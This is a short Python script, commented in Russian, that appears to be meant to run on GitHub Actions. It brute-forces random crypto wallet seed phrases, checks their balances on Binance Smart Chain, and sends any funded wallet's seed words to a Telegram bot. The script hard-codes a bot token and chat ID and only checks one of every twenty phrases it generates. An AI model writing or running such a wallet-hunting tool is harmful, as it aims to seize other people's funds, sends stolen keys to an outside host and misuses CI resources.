import time
import requests
from eth_account import Account
from mnemonic import Mnemonic

# Твои данные
TELEGRAM_TOKEN = "8343501600:AAEO_yNS:y1xLZdJ_tLlaazzteQvIvZeIAvQ" # Исправил опечатку в токене
TELEGRAM_CHAT_ID = "1632903931"
Account.enable_unaudited_hdwallet_features()
mnemo = Mnemonic("english")

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

def hunt():
    send_telegram("🚀 *Охота на GitHub Actions запущена!* \nБот работает удаленно.")
    count = 0
    while True:
        # Генерируем 12 слов
        words = mnemo.generate(strength=128)
        acct = Account.from_mnemonic(words)
        
        # Проверяем баланс в сети BSC (самая быстрая для проверок)
        if count % 20 == 0:
            try:
                res = requests.post('https://bsc-dataseed.binance.org/', 
                                    json={"jsonrpc":"2.0","method":"eth_getBalance","params":[acct.address, "latest"],"id":1}, 
                                    timeout=5).json()
                balance = int(res['result'], 16)
                if balance > 0:
                    msg = f"💰 *КЛАД НАЙДЕН!* 💰\n\nСлова: `{words}`\nАдрес: `{acct.address}`"
                    send_telegram(msg)
            except:
                pass
        
        count += 1
        if count % 100 == 0:
            print(f"Проверено: {count} фраз")

if __name__ == "__main__":
    hunt()
